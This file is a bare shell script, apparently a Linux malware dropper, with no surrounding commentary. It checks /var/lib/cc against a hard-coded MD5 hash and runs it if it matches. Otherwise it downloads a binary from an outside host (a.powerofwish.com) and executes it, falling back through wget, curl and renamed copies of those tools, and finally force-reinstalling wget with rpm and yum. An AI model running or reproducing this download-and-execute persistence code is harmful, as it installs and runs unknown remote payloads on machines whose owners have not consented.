PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin

cd /var/lib


if [ -x "/usr/bin/md5sum" -o -x "/bin/md5sum" ];then
	sum=`md5sum cc|grep b8449098dd2787641f58c136ff48edd0|grep -v grep |wc -l`
	if [ $sum -eq 1 ]; then
		chmod +x /var/lib/cc
		/var/lib/cc
		exit 0
	fi
fi

/bin/rm -rf /var/lib/cc
if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
   wget -c http://a.powerofwish.com/cc -O /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
   curl -fs http://a.powerofwish.com/cc -o /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
elif [ -x "/usr/bin/wge"  -o  -x "/bin/wge" ]; then
   wge -c http://a.powerofwish.com/cc -O /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
   get -c http://a.powerofwish.com/cc -O /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
   cur -fs http://a.powerofwish.com/cc -o /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
elif [ -x "/usr/bin/url"  -o  -x "/bin/url" ]; then
   url -fs http://a.powerofwish.com/cc -o /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
else
   rpm -e --nodeps wget
   yum -y install wget
   wget -c http://a.powerofwish.com/cc -O /var/lib/cc && chmod +x /var/lib/cc && /var/lib/cc
fi
